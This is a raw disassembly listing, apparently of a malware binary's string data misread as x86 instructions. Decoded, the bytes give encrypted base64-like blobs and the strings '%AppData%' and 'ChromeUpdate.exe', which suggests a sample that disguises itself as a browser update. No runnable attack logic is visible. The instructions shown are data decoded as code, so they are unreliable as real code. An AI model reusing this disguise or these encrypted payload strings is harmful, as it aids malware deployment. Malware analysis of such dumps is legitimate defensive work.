  409df4:	34 00                	xor    $0x0,%al
  409df6:	56                   	push   %esi
  409df7:	00 71 00             	add    %dh,0x0(%ecx)
  409dfa:	54                   	push   %esp
  409dfb:	00 55 00             	add    %dl,0x0(%ebp)
  409dfe:	69 00 69 00 68 00    	imul   $0x680069,(%eax),%eax
  409e04:	48                   	dec    %eax
  409e05:	00 46 00             	add    %al,0x0(%esi)
  409e08:	2b 00                	sub    (%eax),%eax
  409e0a:	51                   	push   %ecx
  409e0b:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  409e0f:	00 6a 00             	add    %ch,0x0(%edx)
  409e12:	68 00 56 00 6b       	push   $0x6b005600
  409e17:	00 6d 00             	add    %ch,0x0(%ebp)
  409e1a:	51                   	push   %ecx
  409e1b:	00 32                	add    %dh,(%edx)
  409e1d:	00 66 00             	add    %ah,0x0(%esi)
  409e20:	59                   	pop    %ecx
  409e21:	00 43 00             	add    %al,0x0(%ebx)
  409e24:	6b 00 34             	imul   $0x34,(%eax),%eax
  409e27:	00 42 00             	add    %al,0x0(%edx)
  409e2a:	6c                   	insb   (%dx),%es:(%edi)
  409e2b:	00 50 00             	add    %dl,0x0(%eax)
  409e2e:	4f                   	dec    %edi
  409e2f:	00 39                	add    %bh,(%ecx)
  409e31:	00 45 00             	add    %al,0x0(%ebp)
  409e34:	4b                   	dec    %ebx
  409e35:	00 72 00             	add    %dh,0x0(%edx)
  409e38:	57                   	push   %edi
  409e39:	00 30                	add    %dh,(%eax)
  409e3b:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  409e3f:	00 2f                	add    %ch,(%edi)
  409e41:	00 4a 00             	add    %cl,0x0(%edx)
  409e44:	53                   	push   %ebx
  409e45:	00 4b 00             	add    %cl,0x0(%ebx)
  409e48:	54                   	push   %esp
  409e49:	00 56 00             	add    %dl,0x0(%esi)
  409e4c:	47                   	inc    %edi
  409e4d:	00 53 00             	add    %dl,0x0(%ebx)
  409e50:	34 00                	xor    $0x0,%al
  409e52:	51                   	push   %ecx
  409e53:	00 65 00             	add    %ah,0x0(%ebp)
  409e56:	43                   	inc    %ebx
  409e57:	00 58 00             	add    %bl,0x0(%eax)
  409e5a:	55                   	push   %ebp
  409e5b:	00 57 00             	add    %dl,0x0(%edi)
  409e5e:	67 00 77 00          	add    %dh,0x0(%bx)
  409e62:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409e67:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409e6d:	00 70 00             	add    %dh,0x0(%eax)
  409e70:	44                   	inc    %esp
  409e71:	00 61 00             	add    %ah,0x0(%ecx)
  409e74:	74 00                	je     0x409e76
  409e76:	61                   	popa
  409e77:	00 25 00 00 21 43    	add    %ah,0x43210000
  409e7d:	00 68 00             	add    %ch,0x0(%eax)
  409e80:	72 00                	jb     0x409e82
  409e82:	6f                   	outsl  %ds:(%esi),(%dx)
  409e83:	00 6d 00             	add    %ch,0x0(%ebp)
  409e86:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409e8a:	70 00                	jo     0x409e8c
  409e8c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409e90:	74 00                	je     0x409e92
  409e92:	65 00 2e             	add    %ch,%gs:(%esi)
  409e95:	00 65 00             	add    %ah,0x0(%ebp)
  409e98:	78 00                	js     0x409e9a
  409e9a:	65 00 00             	add    %al,%gs:(%eax)
  409e9d:	59                   	pop    %ecx
  409e9e:	61                   	popa
  409e9f:	00 30                	add    %dh,(%eax)
  409ea1:	00 67 00             	add    %ah,0x0(%edi)
  409ea4:	7a 00                	jp     0x409ea6
  409ea6:	52                   	push   %edx
  409ea7:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  409eab:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  409eaf:	00 46 00             	add    %al,0x0(%esi)
  409eb2:	4a                   	dec    %edx
  409eb3:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  409eb7:	00 46 00             	add    %al,0x0(%esi)
  409eba:	52                   	push   %edx
  409ebb:	00 56 00             	add    %dl,0x0(%esi)
  409ebe:	4d                   	dec    %ebp
  409ebf:	00 33                	add    %dh,(%ebx)
  409ec1:	00 56 00             	add    %dl,0x0(%esi)
  409ec4:	49                   	dec    %ecx
  409ec5:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  409ec9:	00 35 00 48 00 52    	add    %dh,0x52004800
  409ecf:	00 6e 00             	add    %ch,0x0(%esi)
  409ed2:	68 00 6f 00 57       	push   $0x57006f00
  409ed7:	00 6a 00             	add    %ch,0x0(%edx)
  409eda:	6c                   	insb   (%dx),%es:(%edi)
  409edb:	00 56 00             	add    %dl,0x0(%esi)
  409ede:	55                   	push   %ebp
  409edf:	00 32                	add    %dh,(%edx)
  409ee1:	00 46 00             	add    %al,0x0(%esi)
  409ee4:	70 00                	jo     0x409ee6
  409ee6:	52                   	push   %edx
  409ee7:	00 58 00             	add    %bl,0x0(%eax)
  409eea:	51                   	push   %ecx
  409eeb:	00 7a 00             	add    %bh,0x0(%edx)
  409eee:	52                   	push   %edx
  409eef:	00 6b 00             	add    %ch,0x0(%ebx)
  409ef2:	77 00                	ja     0x409ef4
  409ef4:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409ef9:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409efd:	49                   	dec    %ecx
  409efe:	00 56 00             	add    %dl,0x0(%esi)
  409f01:	42                   	inc    %edx
  409f02:	00 2f                	add    %ch,(%edi)
  409f04:	00 52 00             	add    %dl,0x0(%edx)
  409f07:	37                   	aaa
  409f08:	00 73 00             	add    %dh,0x0(%ebx)
  409f0b:	30 00                	xor    %al,(%eax)
  409f0d:	55                   	push   %ebp
  409f0e:	00 2b                	add    %ch,(%ebx)
  409f10:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  409f14:	00 37                	add    %dh,(%edi)
  409f16:	00 4e 00             	add    %cl,0x0(%esi)
  409f19:	5a                   	pop    %edx
  409f1a:	00 41 00             	add    %al,0x0(%ecx)
  409f1d:	4b                   	dec    %ebx
  409f1e:	00 4f 00             	add    %cl,0x0(%edi)
  409f21:	75 00                	jne    0x409f23
  409f23:	42                   	inc    %edx
  409f24:	00 7a 00             	add    %bh,0x0(%edx)
  409f27:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  409f2b:	4f                   	dec    %edi
  409f2c:	00 53 00             	add    %dl,0x0(%ebx)
  409f2f:	4d                   	dec    %ebp
  409f30:	00 75 00             	add    %dh,0x0(%ebp)
  409f33:	6e                   	outsb  %ds:(%esi),(%dx)
  409f34:	00 67 00             	add    %ah,0x0(%edi)
  409f37:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  409f3b:	75 00                	jne    0x409f3d
  409f3d:	58                   	pop    %eax
  409f3e:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f41:	38 00                	cmp    %al,(%eax)
  409f43:	45                   	inc    %ebp
  409f44:	00 6f 00             	add    %ch,0x0(%edi)
  409f47:	4e                   	dec    %esi
  409f48:	00 2f                	add    %ch,(%edi)
  409f4a:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  409f4e:	00 31                	add    %dh,(%ecx)
  409f50:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  409f54:	00 41 00             	add    %al,0x0(%ecx)
  409f57:	6d                   	insl   (%dx),%es:(%edi)
  409f58:	00 47 00             	add    %al,0x0(%edi)
  409f5b:	50                   	push   %eax
  409f5c:	00 6b 00             	add    %ch,0x0(%ebx)
  409f5f:	76 00                	jbe    0x409f61
  409f61:	57                   	push   %edi
  409f62:	00 57 00             	add    %dl,0x0(%edi)
  409f65:	33 00                	xor    (%eax),%eax
  409f67:	32 00                	xor    (%eax),%al
  409f69:	63 00                	arpl   %eax,(%eax)
  409f6b:	50                   	push   %eax
  409f6c:	00 72 00             	add    %dh,0x0(%edx)
  409f6f:	31 00                	xor    %eax,(%eax)
  409f71:	4c                   	dec    %esp
  409f72:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  409f76:	00 63 00             	add    %ah,0x0(%ebx)
  409f79:	5a                   	pop    %edx
  409f7a:	00 51 00             	add    %dl,0x0(%ecx)
  409f7d:	51                   	push   %ecx
  409f7e:	00 4d 00             	add    %cl,0x0(%ebp)
  409f81:	6d                   	insl   (%dx),%es:(%edi)
  409f82:	00 71 00             	add    %dh,0x0(%ecx)
  409f85:	35 00 79 00 30       	xor    $0x30007900,%eax
  409f8a:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f8d:	46                   	inc    %esi
  409f8e:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  409f92:	00 6e 00             	add    %ch,0x0(%esi)
  409f95:	70 00                	jo     0x409f97
  409f97:	79 00                	jns    0x409f99
  409f99:	49                   	dec    %ecx
  409f9a:	00 6f 00             	add    %ch,0x0(%edi)
  409f9d:	41                   	inc    %ecx
  409f9e:	00 31                	add    %dh,(%ecx)
  409fa0:	00 36                	add    %dh,(%esi)
  409fa2:	00 51 00             	add    %dl,0x0(%ecx)
  409fa5:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409faa:	92                   	xchg   %eax,%edx
  409fab:	59                   	pop    %ecx
  409fac:	38 00                	cmp    %al,(%eax)
  409fae:	77 00                	ja     0x409fb0
  409fb0:	78 00                	js     0x409fb2
  409fb2:	31 00                	xor    %eax,(%eax)
  409fb4:	79 00                	jns    0x409fb6
  409fb6:	78 00                	js     0x409fb8
  409fb8:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409fbc:	71 00                	jno    0x409fbe
  409fbe:	68 00 31 00 41       	push   $0x41003100
  409fc3:	00 43 00             	add    %al,0x0(%ebx)
  409fc6:	69 00 71 00 66 00    	imul   $0x660071,(%eax),%eax
  409fcc:	69 00 33 00 2b 00    	imul   $0x2b0033,(%eax),%eax
  409fd2:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  409fd6:	4f                   	dec    %edi
  409fd7:	00 57 00             	add    %dl,0x0(%edi)
  409fda:	74 00                	je     0x409fdc
  409fdc:	46                   	inc    %esi
  409fdd:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fe0:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  409fe4:	51                   	push   %ecx
  409fe5:	00 65 00             	add    %ah,0x0(%ebp)
  409fe8:	71 00                	jno    0x409fea
  409fea:	45                   	inc    %ebp
  409feb:	00 6b 00             	add    %ch,0x0(%ebx)
  409fee:	75 00                	jne    0x409ff0
  409ff0:	45                   	inc    %ebp
  409ff1:	00 77 00             	add    %dh,0x0(%edi)
  409ff4:	2f                   	das
  409ff5:	00 6d 00             	add    %ch,0x0(%ebp)
  409ff8:	57                   	push   %edi
  409ff9:	00 4d 00             	add    %cl,0x0(%ebp)
  409ffc:	33 00                	xor    (%eax),%eax
  409ffe:	63 00                	arpl   %eax,(%eax)
  40a000:	7a 00                	jp     0x40a002
  40a002:	4c                   	dec    %esp
  40a003:	00 58 00             	add    %bl,0x0(%eax)
  40a006:	41                   	inc    %ecx
  40a007:	00 4e 00             	add    %cl,0x0(%esi)
  40a00a:	38 00                	cmp    %al,(%eax)
  40a00c:	4b                   	dec    %ebx
  40a00d:	00 7a 00             	add    %bh,0x0(%edx)
  40a010:	58                   	pop    %eax
  40a011:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40a015:	00 42 00             	add    %al,0x0(%edx)
  40a018:	72 00                	jb     0x40a01a
  40a01a:	56                   	push   %esi
  40a01b:	00 6e 00             	add    %ch,0x0(%esi)
  40a01e:	77 00                	ja     0x40a020
  40a020:	45                   	inc    %ebp
  40a021:	00 62 00             	add    %ah,0x0(%edx)
  40a024:	79 00                	jns    0x40a026
  40a026:	37                   	aaa
  40a027:	00 4b 00             	add    %cl,0x0(%ebx)
  40a02a:	44                   	inc    %esp
  40a02b:	00 79 00             	add    %bh,0x0(%ecx)
  40a02e:	51                   	push   %ecx
  40a02f:	00 50 00             	add    %dl,0x0(%eax)
  40a032:	7a 00                	jp     0x40a034
  40a034:	4a                   	dec    %edx
  40a035:	00 38                	add    %bh,(%eax)
  40a037:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40a03b:	00 6e 00             	add    %ch,0x0(%esi)
  40a03e:	73 00                	jae    0x40a040
  40a040:	54                   	push   %esp
  40a041:	00 5a 00             	add    %bl,0x0(%edx)
  40a044:	6b 00 68             	imul   $0x68,(%eax),%eax
  40a047:	00 38                	add    %bh,(%eax)
  40a049:	00 39                	add    %bh,(%ecx)
  40a04b:	00 32                	add    %dh,(%edx)
  40a04d:	00 31                	add    %dh,(%ecx)
  40a04f:	00 57 00             	add    %dl,0x0(%edi)
  40a052:	72 00                	jb     0x40a054
  40a054:	43                   	inc    %ebx
  40a055:	00 62 00             	add    %ah,0x0(%edx)
  40a058:	4d                   	dec    %ebp
  40a059:	00 58 00             	add    %bl,0x0(%eax)
  40a05c:	4b                   	dec    %ebx
  40a05d:	00 67 00             	add    %ah,0x0(%edi)
  40a060:	62 00                	bound  %eax,(%eax)
  40a062:	51                   	push   %ecx
  40a063:	00 65 00             	add    %ah,0x0(%ebp)
  40a066:	6c                   	insb   (%dx),%es:(%edi)
  40a067:	00 75 00             	add    %dh,0x0(%ebp)
  40a06a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a06b:	00 35 00 32 00 75    	add    %dh,0x75003200
  40a071:	00 2f                	add    %ch,(%edi)
  40a073:	00 70 00             	add    %dh,0x0(%eax)
  40a076:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40a07a:	6c                   	insb   (%dx),%es:(%edi)
  40a07b:	00 50 00             	add    %dl,0x0(%eax)
  40a07e:	2b 00                	sub    (%eax),%eax
  40a080:	7a 00                	jp     0x40a082
  40a082:	31 00                	xor    %eax,(%eax)
  40a084:	44                   	inc    %esp
  40a085:	00 51 00             	add    %dl,0x0(%ecx)
  40a088:	44                   	inc    %esp
  40a089:	00 73 00             	add    %dh,0x0(%ebx)
  40a08c:	31 00                	xor    %eax,(%eax)
  40a08e:	47                   	inc    %edi
  40a08f:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40a093:	00 55 00             	add    %dl,0x0(%ebp)
  40a096:	4b                   	dec    %ebx
  40a097:	00 45 00             	add    %al,0x0(%ebp)
  40a09a:	39 00                	cmp    %eax,(%eax)
  40a09c:	4e                   	dec    %esi
  40a09d:	00 7a 00             	add    %bh,0x0(%edx)
  40a0a0:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40a0a4:	53                   	push   %ebx
  40a0a5:	00 2f                	add    %ch,(%edi)
  40a0a7:	00 37                	add    %dh,(%edi)
  40a0a9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0ad:	00 48 00             	add    %cl,0x0(%eax)
  40a0b0:	63 00                	arpl   %eax,(%eax)
  40a0b2:	75 00                	jne    0x40a0b4
  40a0b4:	71 00                	jno    0x40a0b6
  40a0b6:	4f                   	dec    %edi
  40a0b7:	00 51 00             	add    %dl,0x0(%ecx)
  40a0ba:	59                   	pop    %ecx
  40a0bb:	00 62 00             	add    %ah,0x0(%edx)
  40a0be:	33 00                	xor    (%eax),%eax
  40a0c0:	4d                   	dec    %ebp
  40a0c1:	00 37                	add    %dh,(%edi)
  40a0c3:	00 35 00 30 00 4e    	add    %dh,0x4e003000
  40a0c9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0cc:	38 00                	cmp    %al,(%eax)
  40a0ce:	6b 00 78             	imul   $0x78,(%eax),%eax
  40a0d1:	00 67 00             	add    %ah,0x0(%edi)
  40a0d4:	44                   	inc    %esp
  40a0d5:	00 45 00             	add    %al,0x0(%ebp)
  40a0d8:	49                   	dec    %ecx
  40a0d9:	00 31                	add    %dh,(%ecx)
  40a0db:	00 75 00             	add    %dh,0x0(%ebp)
  40a0de:	7a 00                	jp     0x40a0e0
  40a0e0:	68 00 4c 00 33       	push   $0x33004c00
  40a0e5:	00 65 00             	add    %ah,0x0(%ebp)
  40a0e8:	69 00 33 00 57 00    	imul   $0x570033,(%eax),%eax
  40a0ee:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40a0f2:	31 00                	xor    %eax,(%eax)
  40a0f4:	74 00                	je     0x40a0f6
  40a0f6:	2f                   	das
  40a0f7:	00 68 00             	add    %ch,0x0(%eax)
  40a0fa:	49                   	dec    %ecx
  40a0fb:	00 31                	add    %dh,(%ecx)
  40a0fd:	00 30                	add    %dh,(%eax)
  40a0ff:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40a103:	00 33                	add    %dh,(%ebx)
  40a105:	00 38                	add    %bh,(%eax)
  40a107:	00 33                	add    %dh,(%ebx)
  40a109:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40a10d:	00 51 00             	add    %dl,0x0(%ecx)
  40a110:	45                   	inc    %ebp
  40a111:	00 6f 00             	add    %ch,0x0(%edi)
  40a114:	6e                   	outsb  %ds:(%esi),(%dx)
  40a115:	00 75 00             	add    %dh,0x0(%ebp)
  40a118:	6a 00                	push   $0x0
  40a11a:	65 00 2f             	add    %ch,%gs:(%edi)
  40a11d:	00 38                	add    %bh,(%eax)
  40a11f:	00 6a 00             	add    %ch,0x0(%edx)
  40a122:	63 00                	arpl   %eax,(%eax)
  40a124:	48                   	dec    %eax
  40a125:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40a129:	00 48 00             	add    %cl,0x0(%eax)
  40a12c:	79 00                	jns    0x40a12e
  40a12e:	79 00                	jns    0x40a130
  40a130:	77 00                	ja     0x40a132
  40a132:	45                   	inc    %ebp
  40a133:	00 47 00             	add    %al,0x0(%edi)
  40a136:	47                   	inc    %edi
  40a137:	00 49 00             	add    %cl,0x0(%ecx)
  40a13a:	4c                   	dec    %esp
  40a13b:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40a13f:	00 6e 00             	add    %ch,0x0(%esi)
  40a142:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40a146:	4c                   	dec    %esp
  40a147:	00 77 00             	add    %dh,0x0(%edi)
  40a14a:	47                   	inc    %edi
  40a14b:	00 77 00             	add    %dh,0x0(%edi)
  40a14e:	4e                   	dec    %esi
  40a14f:	00 50 00             	add    %dl,0x0(%eax)
  40a152:	79 00                	jns    0x40a154
  40a154:	35 00 68 00 55       	xor    $0x55006800,%eax
  40a159:	00 38                	add    %bh,(%eax)
  40a15b:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40a15f:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40a163:	00 4f 00             	add    %cl,0x0(%edi)
  40a166:	78 00                	js     0x40a168
  40a168:	76 00                	jbe    0x40a16a
  40a16a:	4d                   	dec    %ebp
  40a16b:	00 4f 00             	add    %cl,0x0(%edi)
  40a16e:	76 00                	jbe    0x40a170
  40a170:	62 00                	bound  %eax,(%eax)
  40a172:	50                   	push   %eax
  40a173:	00 70 00             	add    %dh,0x0(%eax)
  40a176:	57                   	push   %edi
  40a177:	00 48 00             	add    %cl,0x0(%eax)
  40a17a:	44                   	inc    %esp
  40a17b:	00 73 00             	add    %dh,0x0(%ebx)
  40a17e:	4b                   	dec    %ebx
  40a17f:	00 6e 00             	add    %ch,0x0(%esi)
  40a182:	75 00                	jne    0x40a184
  40a184:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a188:	33 00                	xor    (%eax),%eax
  40a18a:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a18e:	45                   	inc    %ebp
  40a18f:	00 41 00             	add    %al,0x0(%ecx)
  40a192:	32 00                	xor    (%eax),%al
  40a194:	53                   	push   %ebx
  40a195:	00 36                	add    %dh,(%esi)
  40a197:	00 2b                	add    %ch,(%ebx)
  40a199:	00 41 00             	add    %al,0x0(%ecx)
  40a19c:	57                   	push   %edi
  40a19d:	00 63 00             	add    %ah,0x0(%ebx)
  40a1a0:	4e                   	dec    %esi
  40a1a1:	00 59 00             	add    %bl,0x0(%ecx)
  40a1a4:	76 00                	jbe    0x40a1a6
  40a1a6:	6a 00                	push   $0x0
  40a1a8:	68 00 48 00 39       	push   $0x39004800
  40a1ad:	00 53 00             	add    %dl,0x0(%ebx)
  40a1b0:	32 00                	xor    (%eax),%al
  40a1b2:	6d                   	insl   (%dx),%es:(%edi)
  40a1b3:	00 56 00             	add    %dl,0x0(%esi)
  40a1b6:	2f                   	das
  40a1b7:	00 62 00             	add    %ah,0x0(%edx)
  40a1ba:	48                   	dec    %eax
  40a1bb:	00 75 00             	add    %dh,0x0(%ebp)
  40a1be:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1bf:	00 59 00             	add    %bl,0x0(%ecx)
  40a1c2:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a1c6:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40a1ca:	59                   	pop    %ecx
  40a1cb:	00 66 00             	add    %ah,0x0(%esi)
  40a1ce:	2f                   	das
  40a1cf:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a1d3:	00 42 00             	add    %al,0x0(%edx)
  40a1d6:	70 00                	jo     0x40a1d8
  40a1d8:	6d                   	insl   (%dx),%es:(%edi)
  40a1d9:	00 30                	add    %dh,(%eax)
  40a1db:	00 39                	add    %bh,(%ecx)
  40a1dd:	00 4a 00             	add    %cl,0x0(%edx)
  40a1e0:	77 00                	ja     0x40a1e2
  40a1e2:	50                   	push   %eax
  40a1e3:	00 77 00             	add    %dh,0x0(%edi)
  40a1e6:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40a1ea:	35 00 47 00 4b       	xor    $0x4b004700,%eax
  40a1ef:	00 67 00             	add    %ah,0x0(%edi)
  40a1f2:	44                   	inc    %esp
  40a1f3:	00 46 00             	add    %al,0x0(%esi)
  40a1f6:	47                   	inc    %edi
  40a1f7:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40a1fb:	00 52 00             	add    %dl,0x0(%edx)
  40a1fe:	53                   	push   %ebx
  40a1ff:	00 37                	add    %dh,(%edi)
  40a201:	00 68 00             	add    %ch,0x0(%eax)
  40a204:	43                   	inc    %ebx
  40a205:	00 49 00             	add    %cl,0x0(%ecx)
  40a208:	49                   	dec    %ecx
  40a209:	00 30                	add    %dh,(%eax)
  40a20b:	00 35 00 77 00 36    	add    %dh,0x36007700
  40a211:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a215:	00 30                	add    %dh,(%eax)
  40a217:	00 51 00             	add    %dl,0x0(%ecx)
  40a21a:	42                   	inc    %edx
  40a21b:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40a21f:	00 75 00             	add    %dh,0x0(%ebp)
  40a222:	34 00                	xor    $0x0,%al
  40a224:	4a                   	dec    %edx
  40a225:	00 4a 00             	add    %cl,0x0(%edx)
  40a228:	59                   	pop    %ecx
  40a229:	00 38                	add    %bh,(%eax)
  40a22b:	00 76 00             	add    %dh,0x0(%esi)
  40a22e:	4f                   	dec    %edi
  40a22f:	00 4e 00             	add    %cl,0x0(%esi)
  40a232:	73 00                	jae    0x40a234
  40a234:	43                   	inc    %ebx
  40a235:	00 65 00             	add    %ah,0x0(%ebp)
  40a238:	47                   	inc    %edi
  40a239:	00 71 00             	add    %dh,0x0(%ecx)
  40a23c:	4f                   	dec    %edi
  40a23d:	00 32                	add    %dh,(%edx)
  40a23f:	00 42 00             	add    %al,0x0(%edx)
  40a242:	6b 00 39             	imul   $0x39,(%eax),%eax
  40a245:	00 43 00             	add    %al,0x0(%ebx)
  40a248:	4a                   	dec    %edx
  40a249:	00 33                	add    %dh,(%ebx)
  40a24b:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40a24f:	00 66 00             	add    %ah,0x0(%esi)
  40a252:	35 00 58 00 6b       	xor    $0x6b005800,%eax
  40a257:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40a25b:	00 45 00             	add    %al,0x0(%ebp)
  40a25e:	79 00                	jns    0x40a260
  40a260:	4d                   	dec    %ebp
  40a261:	00 59 00             	add    %bl,0x0(%ecx)
  40a264:	6a 00                	push   $0x0
  40a266:	2f                   	das
  40a267:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a26b:	00 45 00             	add    %al,0x0(%ebp)
  40a26e:	71 00                	jno    0x40a270
  40a270:	70 00                	jo     0x40a272
  40a272:	66 00 36             	data16 add %dh,(%esi)
  40a275:	00 73 00             	add    %dh,0x0(%ebx)
  40a278:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40a27c:	2f                   	das
  40a27d:	00 38                	add    %bh,(%eax)
  40a27f:	00 59 00             	add    %bl,0x0(%ecx)
  40a282:	58                   	pop    %eax
  40a283:	00 4e 00             	add    %cl,0x0(%esi)
  40a286:	58                   	pop    %eax
  40a287:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40a28b:	00 76 00             	add    %dh,0x0(%esi)
  40a28e:	46                   	inc    %esi
  40a28f:	00 48 00             	add    %cl,0x0(%eax)
  40a292:	6c                   	insb   (%dx),%es:(%edi)
  40a293:	00 56 00             	add    %dl,0x0(%esi)
  40a296:	41                   	inc    %ecx
  40a297:	00 4b 00             	add    %cl,0x0(%ebx)
  40a29a:	4c                   	dec    %esp
  40a29b:	00 71 00             	add    %dh,0x0(%ecx)
  40a29e:	35 00 70 00 59       	xor    $0x59007000,%eax
  40a2a3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2a6:	62 00                	bound  %eax,(%eax)
  40a2a8:	62 00                	bound  %eax,(%eax)
  40a2aa:	5a                   	pop    %edx
  40a2ab:	00 75 00             	add    %dh,0x0(%ebp)
  40a2ae:	73 00                	jae    0x40a2b0
  40a2b0:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40a2b4:	4d                   	dec    %ebp
  40a2b5:	00 48 00             	add    %cl,0x0(%eax)
  40a2b8:	2b 00                	sub    (%eax),%eax
  40a2ba:	48                   	dec    %eax
  40a2bb:	00 63 00             	add    %ah,0x0(%ebx)
  40a2be:	4f                   	dec    %edi
  40a2bf:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40a2c3:	00 68 00             	add    %ch,0x0(%eax)
  40a2c6:	50                   	push   %eax
  40a2c7:	00 38                	add    %bh,(%eax)
  40a2c9:	00 53 00             	add    %dl,0x0(%ebx)
  40a2cc:	41                   	inc    %ecx
  40a2cd:	00 52 00             	add    %dl,0x0(%edx)
  40a2d0:	7a 00                	jp     0x40a2d2
  40a2d2:	63 00                	arpl   %eax,(%eax)
  40a2d4:	45                   	inc    %ebp
  40a2d5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d9:	00 2b                	add    %ch,(%ebx)
  40a2db:	00 51 00             	add    %dl,0x0(%ecx)
  40a2de:	4f                   	dec    %edi
  40a2df:	00 79 00             	add    %bh,0x0(%ecx)
  40a2e2:	4b                   	dec    %ebx
  40a2e3:	00 2b                	add    %ch,(%ebx)
  40a2e5:	00 47 00             	add    %al,0x0(%edi)
  40a2e8:	71 00                	jno    0x40a2ea
  40a2ea:	37                   	aaa
  40a2eb:	00 4a 00             	add    %cl,0x0(%edx)
  40a2ee:	54                   	push   %esp
  40a2ef:	00 66 00             	add    %ah,0x0(%esi)
  40a2f2:	63 00                	arpl   %eax,(%eax)
  40a2f4:	78 00                	js     0x40a2f6
  40a2f6:	35 00 71 00 62       	xor    $0x62007100,%eax
  40a2fb:	00 36                	add    %dh,(%esi)
  40a2fd:	00 5a 00             	add    %bl,0x0(%edx)
  40a300:	4e                   	dec    %esi
  40a301:	00 45 00             	add    %al,0x0(%ebp)
  40a304:	34 00                	xor    $0x0,%al
  40a306:	6e                   	outsb  %ds:(%esi),(%dx)
  40a307:	00 4f 00             	add    %cl,0x0(%edi)
  40a30a:	63 00                	arpl   %eax,(%eax)
  40a30c:	43                   	inc    %ebx
  40a30d:	00 52 00             	add    %dl,0x0(%edx)
  40a310:	74 00                	je     0x40a312
  40a312:	71 00                	jno    0x40a314
  40a314:	50                   	push   %eax
  40a315:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40a319:	00 4a 00             	add    %cl,0x0(%edx)
  40a31c:	47                   	inc    %edi
  40a31d:	00 50 00             	add    %dl,0x0(%eax)
  40a320:	67 00 6d 00          	add    %ch,0x0(%di)
  40a324:	34 00                	xor    $0x0,%al
  40a326:	46                   	inc    %esi
  40a327:	00 48 00             	add    %cl,0x0(%eax)
  40a32a:	76 00                	jbe    0x40a32c
  40a32c:	44                   	inc    %esp
  40a32d:	00 71 00             	add    %dh,0x0(%ecx)
  40a330:	55                   	push   %ebp
  40a331:	00 68 00             	add    %ch,0x0(%eax)
  40a334:	63 00                	arpl   %eax,(%eax)
  40a336:	7a 00                	jp     0x40a338
  40a338:	39 00                	cmp    %eax,(%eax)
  40a33a:	6d                   	insl   (%dx),%es:(%edi)
  40a33b:	00 41 00             	add    %al,0x0(%ecx)
  40a33e:	74 00                	je     0x40a340
  40a340:	53                   	push   %ebx
  40a341:	00 30                	add    %dh,(%eax)
  40a343:	00 4e 00             	add    %cl,0x0(%esi)
  40a346:	6e                   	outsb  %ds:(%esi),(%dx)
  40a347:	00 2b                	add    %ch,(%ebx)
  40a349:	00 45 00             	add    %al,0x0(%ebp)
  40a34c:	59                   	pop    %ecx
  40a34d:	00 59 00             	add    %bl,0x0(%ecx)
  40a350:	44                   	inc    %esp
  40a351:	00 4d 00             	add    %cl,0x0(%ebp)
  40a354:	54                   	push   %esp
